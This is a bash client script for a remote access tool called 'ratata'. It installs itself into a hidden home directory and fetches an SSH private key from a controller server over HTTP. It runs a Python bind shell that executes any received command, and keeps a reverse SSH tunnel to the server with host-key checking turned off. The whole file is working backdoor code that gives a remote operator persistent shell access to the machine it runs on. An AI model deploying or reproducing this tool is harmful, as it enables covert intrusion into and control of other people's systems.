#!/usr/bin/env bash

SERVER="127.0.0.1" #Your Server's IP
HTTP_PORT="31333" #Your Server's HTTP PORT
SSH_KEY="your_sha512_ssh_key_filename" #Update according to your server's configuration
SSH_USER="lp1" #The user which will be used to connect to the server
LPORT="5001"
RPORT="5002"
SSH_PORT="9101" #Your server's SSH port
TIMEOUT=3

### Custom Execution

POST_SSH_COMMAND="whoami"

SHELL='exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("127.0.0.1",LPORT));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
SHELL=${SHELL/"LPORT"/$LPORT}

if [ "$SSH_KEY" = "your_sha512_ssh_key_filename" ];then
   echo "You need to replace the SSH_KEY parameter by the filename created in the ssh_keys directory of your server"
   exit
fi

if [ ! -d "$HOME/.ratata" ];then
    echo "Client not installed - Installing"
    mkdir "$HOME/.ratata";
fi

if [ ! -f "$HOME/.ratata/cli.sh" ];then
    cat $0 >> "$HOME/.ratata/cli.sh"
fi

if [ ! -f "$HOME/.ratata/id_rsa" ];then
    curl "http://$SERVER:$HTTP_PORT/$SSH_KEY" 2>/dev/null >> "$HOME/.ratata/id_rsa" && chmod 600 "$HOME/.ratata/id_rsa"
    echo "SSH key updated"
fi


for I in $(seq 1 $TIMEOUT);do
    if screen -list | grep "bind_shell";
    then
	echo "Bind shell already listening"
    else
	echo "Restarting bind shell"
	screen -dmS bind_shell python -c "$SHELL"
    fi
    if screen -list | grep "ssh_tunnel";
    then
	echo "SSH Tunnel already established";
    else
	echo "Restarting SSH tunnel"
	ssh -o "ConnectTimeout 3" \
            -o "StrictHostKeyChecking no" \
            -o "UserKnownHostsFile /dev/null" \
	    -i "$HOME/.ratata/id_rsa" \
	    -p $SSH_PORT \
	    $SSH_USER@$SERVER \
	    $POST_SSH_COMMAND && \
	screen -dmS ssh_tunnel ssh -o "ConnectTimeout 3" \
            -o "StrictHostKeyChecking no" \
            -o "UserKnownHostsFile /dev/null" \
	    -i "$HOME/.ratata/id_rsa" \
	    -p $SSH_PORT \
	    -R 127.0.0.1:$RPORT:127.0.0.1:$LPORT \
	    $SSH_USER@$SERVER
    fi
    sleep 5
done
